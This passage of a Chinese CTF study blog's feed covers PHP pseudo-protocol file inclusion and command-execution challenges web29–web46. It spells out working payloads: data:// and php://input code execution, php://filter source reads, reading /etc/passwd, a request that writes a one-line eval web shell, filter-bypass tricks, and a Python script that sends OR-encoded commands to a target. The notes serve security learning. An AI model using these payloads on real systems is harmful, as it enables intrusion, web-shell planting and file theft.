class="language-none">http:&#x2F;&#x2F;xxx&#x2F;include.php?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php phpinfo?&gt;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>data://text/plain;base64,<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;xxx&#x2F;include.php?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b   &#x2F;&#x2F;后面这一串就是base64编码后的&lt;?php phpinfo()?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><h2 id="file-协议"><a href="#file-协议" class="headerlink" title="file://协议"></a>file://协议</h2><h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h3><ol><li>allow_url_fopen和allow_url_include为on和close都可，没有什么严格的条件</li></ol><h3 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h3><ol><li>访问本地文件系统，在CTF中通常用来读取本地文件的且不受allow_url_fopen和allow_url_include的影响</li><li>include()/require()/include_once()/require_once()参数可控的情况下，如导入为非.php文件，则仍按照php语法进行解析，这是include()函数所决定的。如果上传一个1.txt，仍然可以当作一个php文件去解析</li></ol><h3 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h3><ol><li>file:// — 访问本地文件系统</li><li>说明文件系统 是 PHP 使用的默认封装协议，展现了本地文件系统。 当指定了一个相对路径(不以://indows 盘符开头的路径)提供的路径将基于当前的工作目录。在很多情况下是脚本所在的目录，除非被修改了。</li></ol><h2 id="php"><a href="#php" class="headerlink" title="php://"></a>php://</h2><h3 id="条件-1"><a href="#条件-1" class="headerlink" title="条件"></a>条件</h3><ol><li>allow_url_fopen:off/on</li><li>allow_url_include :仅php://input php://stdin php://memory php://temp 需要on</li></ol><h3 id="作用-1"><a href="#作用-1" class="headerlink" title="作用"></a>作用</h3><ol><li>php:// 访问各个输入/输出流(I/O streams)，在CTF中经常使用的是php://filter和php://input</li><li>php://filter用于读取源码</li><li>php://input用于执行php代码</li></ol><h3 id="php-filter-参数详解"><a href="#php-filter-参数详解" class="headerlink" title="php://filter 参数详解"></a>php://filter 参数详解</h3><ol><li>该协议的参数会在该协议路径上进行传递，多个参数都可以在一个路径上传递</li><li>简单点说，路径上写参数，参数加到php://filter的路径后面</li></ol><h3 id="示例，最常用的php-filter伪代码"><a href="#示例，最常用的php-filter伪代码" class="headerlink" title="示例，最常用的php://filter伪代码"></a>示例，最常用的php://filter伪代码</h3><ol><li>php://filter/read=convert.base64-encode/resource=[文件名]//后面的可以省略<a href="%E9%92%88%E5%AF%B9php%E6%96%87%E4%BB%B6%E9%9C%80%E8%A6%81base64%E8%BF%9B%E8%A1%8C%E7%BC%96%E7%A0%81">读取文件源码</a><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;127.0.0.1&#x2F;include.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;phpinfo.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>php://input + [POST DATA]执行php代码<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;127.0.0.1&#x2F;include.php?file&#x3D;php:&#x2F;&#x2F;input[POST DATA部分][POST DATA]就是php代码，例如&lt;?php phpinfo();?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li>如果有写入权限，则可以写入一句话木马<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;127.0.0.1&#x2F;include.php?file&#x3D;php:&#x2F;&#x2F;input[POST DATA部分]&lt;?php fputs(fopen(&#39;1juhua.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_GET[cmd]); ?&gt;&#39;); ?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>命令执行漏洞</title>
      <link href="/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
      <url>/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<h1 id="命令执行漏洞"><a href="#命令执行漏洞" class="headerlink" title="命令执行漏洞"></a>命令执行漏洞</h1><h2 id="常用绕过"><a href="#常用绕过" class="headerlink" title="常用绕过"></a>常用绕过</h2><ol><li>绕过php，flag等特殊字符：使用通配符</li><li>绕过system等执行函数：使用反单引号</li><li>过滤了. \ `等函数常用字符<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220718153954.png">,但是没有过滤<strong>$和_</strong>,使用<strong>逃逸</strong>，c=eval($_GET[1])</li><li>最nb的是可以使用URL编码进行绕过，因为服务器会自动解一层url编码，所以可以对过滤掉的字符进行一次url编码</li><li>过滤了分号，最后一条语句可以不带分号，结束的标志为’?&gt;’,则我们可以将两条语句中间需要分号的位置替换为’?&gt;’,那么就可以使用两条语句</li><li>过滤了分号和括号，则必须使用语言结构，echo print isset unset include require，使用include加上php过滤器实现</li><li>文件包含题目：使用伪协议：data伪协议可以执行后面的php代码</li><li>过滤掉了字符和数字：使用url编码去代替字符，如果可以使用或运算，即可通过或运算去取字符，web41</li><li>如果是过滤掉了冒号，则是想要过滤掉使用伪协议的方法，那么我们可以先逃逸出去一个变量后再使用伪协议进行文件包含操作</li><li>绕过了eval和system等执行函数，我们可以使用data伪协议，data伪协议data://text/plain,可以直接执行后面跟着的php代码</li><li>如果不能直接访问flag.php，可以先使用mv flag.php 1.txt进行重命名之后再访问1.txt,从而cat到flag.php中的内容</li><li>当遇到了黑洞问题，可以使用双写绕过，例如?c=ls;ls</li><li>当遇到了黑洞问题，并且过滤了分号，可以使用&amp;&amp;来起到分号的分隔作用</li><li>当过滤掉了空格，可以使用其它的URL编码后的空白符:<pre class="line-numbers language-none"><code class="language-none">空格 %26 +   tab水平制表符 %09 回车 %0a或%0A<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><h2 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h2><h3 id="cookie的概念"><a href="#cookie的概念" class="headerlink" title="cookie的概念"></a>cookie的概念</h3><ol><li>cookie用于识别用户，cookie是服务器留在用户计算机中的小文件，每当相同的计算机通过浏览器请求页面时，它同时会发送cookie<h3 id="isset"><a href="#isset" class="headerlink" title="isset()"></a>isset()</h3></li><li>检查变量是否为空，还要检查变量是否已经设置/声明</li><li>意味着必须声明，并且不为NULL，才能返回true</li></ol><h3 id="preg-match"><a href="#preg-match" class="headerlink" title="preg_match"></a>preg_match</h3><ol><li>使用正则表达式对字符串中的“w3schools”执行不区分大小写的搜索：</li><li>该函数返回是否在字符串中找到匹配项。preg_match()</li><li>preg_match(pattern, input, matches, flags, offset)<br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220718145036.png"></li></ol><h3 id="php中的通配符"><a href="#php中的通配符" class="headerlink" title="php中的通配符"></a>php中的通配符</h3><ol><li>和Linux的通配符相同</li><li>*可以代表任意个字符</li><li>？可以代表一个字符，对字符的数量有限制</li></ol><h3 id="system"><a href="#system" class="headerlink" title="system()"></a>system()</h3><ol><li>system($shell,$shell_return);</li><li>函数的作用是执行内部的shell命令，并且在函数执行后，直接在终端窗口打印命令执行的结果</li><li>函数的返回值是命令的执行结果的最后一行</li></ol><h3 id="cp-from-to"><a href="#cp-from-to" class="headerlink" title="cp(from , to);"></a>cp(from , to);</h3><ol><li>同linux的cp命令</li></ol><h3 id="题"><a href="#题" class="headerlink" title="题"></a>题</h3><ol><li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220718150508.png"></li><li>get传参，传给变量c，在变量c中使用preg_match来匹配flag，如果没有flag，就执行变量c中的语句</li><li>给c传值，用system函数产生回显<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220718150648.png">，可以解析并执行</li><li>因为不能出现flag，所以使用<strong>cp命令</strong>给flag.php换个名字,<strong>这个地方cp是shell命令，并不是一个函数</strong>，所以没有类似于函数的传参形式</li><li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220718150936.png"></li><li>直接在路径后面使用文件名称来访问<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220718151056.png"></li></ol><h2 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h2><h3 id="反单引号"><a href="#反单引号" class="headerlink" title="反单引号"></a>反单引号</h3><ol><li>反单引号在php中和system()函数相同，起到命令执行的作用<pre class="line-numbers language-none"><code class="language-none">&#96;cp flag.php 1.txt&#96;  &#x2F;&#x2F;这个地方是反单引号和system(&#39;cp flag.php 1.txt&#39;)  &#x2F;&#x2F;这个地方是单引号的作用是相同的<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="题-1"><a href="#题-1" class="headerlink" title="题"></a>题</h3><ol><li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220718151237.png"></li><li>多了几个过滤</li><li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220718151852.png"></li></ol><h2 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h2><h3 id="preg-match中的转义"><a href="#preg-match中的转义" class="headerlink" title="preg_match中的转义"></a>preg_match中的转义</h3><ol><li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220718152309.png"></li><li>\后面的字符代表转义，例如： ‘\.’ 即为’.’</li></ol><h3 id="逃逸"><a href="#逃逸" class="headerlink" title="逃逸"></a>逃逸</h3><ol><li>中间搭一个桥，使用超全局变量</li></ol><h3 id="题-2"><a href="#题-2" class="headerlink" title="题"></a>题</h3><ol><li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220718152514.png"></li><li>过滤了更多，对’和.都有过滤</li><li>使用c=eval($_GET[1]);对c进行逃逸操作，这个变量1逃逸出去了，1不属于c,则变量1可以使用任何过滤掉的字符</li><li>构造?c=eval($_GET[1]);&amp;1=system(‘cp flag.php 1.txt’);</li><li>在<strong>路径后面直接加上/1.txt</strong>，就可以查看到flag.php中的内容了,但是不能在system()中拼接cat 1.txt</li><li><strong>当有新文件产生时，直接在url后面拼接上新文件的名字</strong></li><li><strong>system()函数中传参一定要加上单引号</strong>，system(‘ls’),system(‘cp xxx xxxx’)</li></ol><h2 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h2><h3 id="include"><a href="#include" class="headerlink" title="include"></a>include</h3><ol><li>include语句获取指定文件中存在的所有文本/代码/标记，并将其<strong>复制</strong>到使用include语句的文件中<pre class="line-numbers language-none"><code class="language-none">include require<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>希望在报错时继续执行并且向用户显示输出，使用include语句，因为当include语句包含的文件不存在时，只是产生一个警告，但是脚本会继续执行</li><li>而require引用的文件如果不存在，就会提示错误，并终止脚本的运行<pre class="line-numbers language-none"><code class="language-none">include &quot;header.htm&quot;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>上面的header.htm中可以php语句，因为可以包含html静态文件，所以可以设计缓存机制，比如把一些页面分为几部分，有一些读取数据库耗费效率的部分可以缓存为html，然后通过include</li><li>文件上传中include代码执行原理：<pre class="line-numbers language-php" data-language="php"><code class="language-php">$i=include 'abc.php';abc.php中源码为<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token keyword">return</span> <span class="token string double-quoted-string">"hello world"</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>那么echo $i;如果include中引用的源码中使用了return，则返回return中的返回值，如果没有，则返回1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="题："><a href="#题：" class="headerlink" title="题："></a>题：</h3><ol><li>大致方法为按照文件包含的方法去做</li><li>空格绕过：使用url编码</li><li>因为过滤了反单引号，可以使用include包含执行代码去绕过</li><li>相当于是<strong>逃逸加上文件包含的传参方式</strong><pre class="line-numbers language-none"><code class="language-none">?c&#x3D;include%0a$_GET[1]?&gt;&amp;1&#x3D;&#x2F;etc&#x2F;passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220719122127.png">，发现可以回显</li><li>可以使用文件包含的原理来实现<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220719122230.png">，原理就是加上一个php的过滤器</li><li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220719122336.png">，得到一串base64编码，解码即可获得flag<br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220719122415.png"></li></ol><h2 id="web33"><a href="#web33" class="headerlink" title="web33"></a>web33</h2><ol><li>与web32中的方式一样，这次也可以使用require</li><li>尝试?c=%0a$_GET[1]?&gt;&amp;1=/etc/passwd发现可以解析</li><li>加上过滤器，php://filter/convert.base64-encode/resource=index.php，找flag.php即可得到base64编码，解码得到flag</li></ol><h2 id="web34"><a href="#web34" class="headerlink" title="web34"></a>web34</h2><h3 id="isset-1"><a href="#isset-1" class="headerlink" title="isset()"></a>isset()</h3><pre class="line-numbers language-none"><code class="language-none">bool isset ( mixed $var [, mixed $... ] )<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li>用于检测变量是否已经设置，并且不为NULL</li><li>如果一次传入多个参数，那么isset()只有在全部参数<strong>都被设置</strong>时才会返回TRUE，计算过程从左到右，中途遇到没有设置的变量会立刻停止</li><li>mixed $var为传入的变量</li></ol><h3 id="unset"><a href="#unset" class="headerlink" title="unset()"></a>unset()</h3><ol><li>用于销毁给定的变量<pre class="line-numbers language-none"><code class="language-none">void unset ( mixed $var [, mixed $... ] )<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>$var是要销毁的变量</li></ol><h3 id="题：-1"><a href="#题：-1" class="headerlink" title="题："></a>题：</h3><ol><li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220720094642.png">过滤了冒号，为了过滤php伪协议形式的命令</li><li>分号和括号过滤，则只能使用语言结构，语言结构的函数：print echo isset unset include require</li><li>对于?c=print%0a$_GET[1]?&gt;&amp;1=phpinfo();只能出现</li><li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220720154430.png"></li><li>的字符：二进制数据段和代码段的区别关系，就是print没法像eval一样将字符当作php代码去执行</li><li>使用include就可以使用文件包含的方式去实现命令执行</li><li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220720154643.png"></li></ol><h2 id="对于get传参时不加单引号的问题"><a href="#对于get传参时不加单引号的问题" class="headerlink" title="对于get传参时不加单引号的问题"></a>对于get传参时不加单引号的问题</h2><ol><li>$_GET[1]和$_GET[‘1’]</li><li>$_GET[1]不加单引号可以起到php向下兼容的作用，但是后面可能会随着php版本更新取消这种写法</li><li>所以不确定php版本和是否被禁止，应该都试一遍</li></ol><h2 id="web37，文件包含"><a href="#web37，文件包含" class="headerlink" title="web37，文件包含"></a>web37，文件包含</h2><h3 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h3><ol><li><a href="https://strongwill.top/php%E4%BC%AA%E5%8D%8F%E8%AE%AE">https://strongwill.top/php伪协议</a></li></ol><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><ol><li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220720163511.png"></li><li>发现是一个文件包含题目，考虑使用php伪协议</li><li>对于要包含php执行代码的文件包含题目，使用data://text/plain,伪协议可以<strong>绕过过滤了eval等执行函数</strong>的情况<pre class="line-numbers language-none"><code class="language-none">?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php phpinfo();?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>执行上面的函数发现可以执行，满足fopen和include都开启的条件，则后面的php执行代码可以操作<pre class="line-numbers language-none"><code class="language-none">?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php system(&quot;mv fla?.php 1.txt&quot;)?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>和过滤后缀的题目一样，重命名后再在路径后面直接添加1.txt即可访问到</li><li><strong>有新文件产生在url后面拼接新文件的名字</strong></li></ol><h2 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h2><h3 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h3><ol><li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220721141702.png"></li><li>发现还是一个文件包含题目，考虑使用php伪协议</li><li>使用伪协议发现可以执行<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220721141821.png"></li><li>继续执行将flag.php文件换名的操作，最后直接在URL后面加上新换名的文件即可查看到flag<pre class="line-numbers language-none"><code class="language-none">?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?&#x3D; system(&quot;cp fla?.??? 1.txt&quot;);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><h2 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><ol><li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220721142504.png"></li><li>发现只是过滤了参数c中的”flag“字段，还是一个文件包含题目，考虑是使用伪协议</li><li>按照上面的方式即可得到flag</li></ol><h2 id="web40"><a href="#web40" class="headerlink" title="web40"></a>web40</h2><h3 id="array-pop"><a href="#array-pop" class="headerlink" title="array_pop()"></a>array_pop()</h3><ol><li>删除数组中的最后一个元素<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">array_pop</span><span class="token punctuation">(</span><span class="token keyword type-casting">array</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>其中array参数是必须的</li><li>返回值：返回数组中的最后一个值，如果数组是空的，或者不是一个数组，将返回NULL</li></ol><h3 id="print-r"><a href="#print-r" class="headerlink" title="print_r()"></a>print_r()</h3><ol><li>print_r()函数用于打印变量，以更容易理解的方式展示<pre class="line-numbers language-none"><code class="language-none">bool print_r(mixed $expression [,bool $return]);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>$expression为要打印的变量，如果是string,integer,float则会打印变量值本身，如果是array类型，将会按照一定的格式显示键和元素</li><li>$return:可选，如果为true，则不会输出结果，而是将返回值的结果赋值给一个变量，false则直接输出结果，默认为false<pre class="line-numbers language-none"><code class="language-none">&lt;?php$a &#x3D; array (&#39;a&#39; &#x3D;&gt; &#39;apple&#39;, &#39;b&#39; &#x3D;&gt; &#39;banana&#39;, &#39;c&#39; &#x3D;&gt; array (&#39;x&#39;,&#39;y&#39;,&#39;z&#39;));print_r ($a);?&gt;返回结果为Array(    [a] &#x3D;&gt; apple    [b] &#x3D;&gt; banana    [c] &#x3D;&gt; Array        (            [0] &#x3D;&gt; x            [1] &#x3D;&gt; y            [2] &#x3D;&gt; z        ))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">&lt;?php$b &#x3D; array (&#39;m&#39; &#x3D;&gt; &#39;monkey&#39;, &#39;foo&#39; &#x3D;&gt; &#39;bar&#39;, &#39;x&#39; &#x3D;&gt; array (&#39;x&#39;, &#39;y&#39;, &#39;z&#39;));$results &#x3D; print_r ($b, true); &#x2F;&#x2F; $results 包含了 print_r 的输出结果?&gt;这个则没有返回值，因为输出结果赋值给了results变量，$return的参数值设置为了true<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="next"><a href="#next" class="headerlink" title="next()"></a>next()</h3><ol><li>next()函数将内部指针指向数组中的下一个元素，并输出</li><li>返回值为内部指针指向的下一个元素的值</li><li>next(array)内部参数为array，是一个数组</li></ol><h3 id="current"><a href="#current" class="headerlink" title="current()"></a>current()</h3><ol><li>输出数组中当前内部指针指向的元素的值</li><li>每个数组中都有一个内部的指针指向它的”当前”元素，初始指向插入到数组中的第一个元素。</li><li>该函数不会移动内部指针</li></ol><h3 id="end"><a href="#end" class="headerlink" title="end()"></a>end()</h3><h3 id="prev"><a href="#prev" class="headerlink" title="prev()"></a>prev()</h3><h3 id="reset"><a href="#reset" class="headerlink" title="reset()"></a>reset()</h3><h3 id="each"><a href="#each" class="headerlink" title="each()"></a>each()</h3><ol><li>each()返回的不只是值，是键值对，并且将内部指针向前移动<br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220721145855.png"></li></ol><h3 id="get-defined-vars"><a href="#get-defined-vars" class="headerlink" title="get_defined_vars()"></a>get_defined_vars()</h3><ol><li>get_defined_vars()函数返回由所有已经定义的变量所组成的数组<pre class="line-numbers language-none"><code class="language-none">array get_defined_vars(void);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>返回值：返回一个包含所有已经定义变量列表的多维数组，这些变量包括环境变量，服务器变量，和用户定义的变量</li></ol><h3 id="题目：-1"><a href="#题目：-1" class="headerlink" title="题目："></a>题目：</h3><ol><li>因为不能用$,所以不能使用之前的逃逸字符来绕过</li><li>考虑是否能通过打印变量，从变量中获取到信息<pre class="line-numbers language-none"><code class="language-none">?c&#x3D;print_r(get_defined_vars());<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220721150824.png"><br>发现是通过post给这个数组传参，尝试加一个post值</li><li>post传参后回显<br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220721150904.png"></li><li>为了拿到array中的那个phpinfo()的字符串，rce一下，使用next函数将指针后移,并且形成了一个新的数组，这个数组的值为phpinfo(),键为它的键</li><li>为了拿到指针指向的那个值，弹出array_pop()，将会返回数组中的最后一个值</li></ol><h2 id="web41"><a href="#web41" class="headerlink" title="web41"></a>web41</h2><h3 id="或运算取字符"><a href="#或运算取字符" class="headerlink" title="或运算取字符"></a>或运算取字符</h3><ol><li>%40 | %01 可以取到A，或运算是两个都为0才为0，一个为1则为1</li><li>计算机中保存URL编码是通过十六进制保存的<pre class="line-numbers language-none"><code class="language-none">%40的二进制为0100 0000%01的二进制为0000 0001取或得到     0100 0001结果从二进制转为十六进制，得到结果为65，转ascii码为A<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="生成可用字符的脚本"><a href="#生成可用字符的脚本" class="headerlink" title="生成可用字符的脚本"></a>生成可用字符的脚本</h3><ol><li>原理：从进行异或的字符中排除掉被过滤的，然后判断异或得到的字符是否为可见字符<pre class="line-numbers language-none"><code class="language-none">&lt;?php$myfile &#x3D; fopen(&quot;rce_or.txt&quot;, &quot;w&quot;);$contents&#x3D;&quot;&quot;;for ($i&#x3D;0; $i &lt; 256; $i++) &#123; for ($j&#x3D;0; $j &lt;256 ; $j++) &#123; if($i&lt;16)&#123;$hex_i&#x3D;&#39;0&#39;.dechex($i);&#125;else&#123;$hex_i&#x3D;dechex($i);&#125;if($j&lt;16)&#123;$hex_j&#x3D;&#39;0&#39;.dechex($j);&#125;else&#123;$hex_j&#x3D;dechex($j);&#125;$preg &#x3D; &#39;&#x2F;[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-&#x2F;i&#39;;if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j)))&#123;echo &quot;&quot;;    &#125;  else&#123;$a&#x3D;&#39;%&#39;.$hex_i;$b&#x3D;&#39;%&#39;.$hex_j;$c&#x3D;(urldecode($a)|urldecode($b));if (ord($c)&gt;&#x3D;32&amp;ord($c)&lt;&#x3D;126) &#123;$contents&#x3D;$contents.$c.&quot; &quot;.$a.&quot; &quot;.$b.&quot;\n&quot;;&#125;&#125;&#125;&#125;fwrite($myfile,$contents);fclose($myfile);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="python脚本跑"><a href="#python脚本跑" class="headerlink" title="python脚本跑"></a>python脚本跑</h3><ol><li>用法：python exp.py <url></li><li>传递参数getflag<pre class="line-numbers language-none"><code class="language-none"># -*- coding: utf-8 -*-import requestsimport urllibfrom sys import *import osos.system(&quot;php rce_or.php&quot;)  #没有将php写入环境变量需手动运行if(len(argv)!&#x3D;2):   print(&quot;&#x3D;&quot;*50)   print(&#39;USER：python exp.py &lt;url&gt;&#39;)   print(&quot;eg：  python exp.py http:&#x2F;&#x2F;ctf.show&#x2F;&quot;)   print(&quot;&#x3D;&quot;*50)   exit(0)url&#x3D;argv[1]def action(arg):   s1&#x3D;&quot;&quot;   s2&#x3D;&quot;&quot;   for i in arg:       f&#x3D;open(&quot;rce_or.txt&quot;,&quot;r&quot;)       while True:           t&#x3D;f.readline()           if t&#x3D;&#x3D;&quot;&quot;:               break           if t[0]&#x3D;&#x3D;i:               #print(i)               s1+&#x3D;t[2:5]               s2+&#x3D;t[6:9]               break       f.close()   output&#x3D;&quot;(\&quot;&quot;+s1+&quot;\&quot;|\&quot;&quot;+s2+&quot;\&quot;)&quot;   return(output)   while True:   param&#x3D;action(input(&quot;\n[+] your function：&quot;) )+action(input(&quot;[+] your command：&quot;))   data&#x3D;&#123;       &#39;c&#39;:urllib.parse.unquote(param)       &#125;   r&#x3D;requests.post(url,data&#x3D;data)   print(&quot;\n[*] result:\n&quot;+r.text)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h3><ol><li>过滤了$,+,-,^,~,使得异或自增和取反构造字符都无法使用，同时过滤了字母和数字，但是特意留了个字符|，最重要的是没有过滤掉%,所以可以使用URL编码去解决问题<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220721153703.png"></li><li>可以从ASCII为0-255的字符中找到或运算能得到的可用的字符</li><li>跑脚本吧，虽然最后我也没解出来，但是思路是对的</li></ol><h2 id="web42"><a href="#web42" class="headerlink" title="web42"></a>web42</h2><h3 id="黑洞"><a href="#黑洞" class="headerlink" title="黑洞"></a>黑洞</h3><ol><li>‘&gt;/dev/null’命令</li><li>目的是抑制各种命令输出的空设备<a href="https://linuxhint.com/two-dev-null-command-purpose/">https://linuxhint.com/two-dev-null-command-purpose/</a><br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220729154309.png"></li></ol><h2 id="web43"><a href="#web43" class="headerlink" title="web43"></a>web43</h2><h3 id="过滤掉分号，但是还是需要两条命令的情况"><a href="#过滤掉分号，但是还是需要两条命令的情况" class="headerlink" title="过滤掉分号，但是还是需要两条命令的情况"></a>过滤掉分号，但是还是需要两条命令的情况</h3><ol><li>过滤掉了分号，但是还是需要两条命令</li><li>可以使用&amp;&amp;</li><li>当前面的语句执行结果为true时，会执行后面的语句，而且前后是分割的两条命令</li><li>遇到黑洞问题并且过滤掉了分号就可以用&amp;&amp;来起到分隔作用</li><li>shell会执行第一个参数，将第二个参数带入到黑洞</li><li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221013185128.png"><pre class="line-numbers language-none"><code class="language-none">if(!preg_match(&quot;&#x2F;\;|cat&#x2F;i&quot;, $c))&#123;        system($c.&quot; &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1&quot;);  &#125; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220729155254.png"></li></ol><h3 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h3><ol><li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220729160723.png"></li><li>发现有黑洞，并且过滤掉了分号，我们可以使用&amp;&amp;对两条命令进行分隔，成为两条命令</li><li>传参?c=ls&amp;&amp;ls ,并对&amp;&amp;进行URL编码，即传参?c=ls%26%26ls 可以查看到回显，那么我们可以修改第一条命令来得到flag，因为第二条命令进入了黑洞中<br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220729160856.png"></li><li>?c=tac flag.php%26%26ls得到flag</li></ol><h2 id="web46"><a href="#web46" class="headerlink" title="web46"></a>web46</h2><h3 id="当过滤掉数字和-时，URL编码中的数字不会被过滤"><a href="#当过滤掉数字和-时，URL编码中的数字不会被过滤" class="headerlink" title="当过滤掉数字和%时，URL编码中的数字不会被过滤"></a>当过滤掉数字和%时，URL编码中的数字不会被过滤</h3><ol><li>当过滤掉数字时，URL编码中的数字不会被过滤</li><li>因为URL编码在上传的过程中已经被浏览器解了一次码了，传到服务器的时候已经是字符而不是URL编码的数字了</li><li>%同理</li></ol><h3 id="题目-4"><a href="#题目-4" class="headerlink" 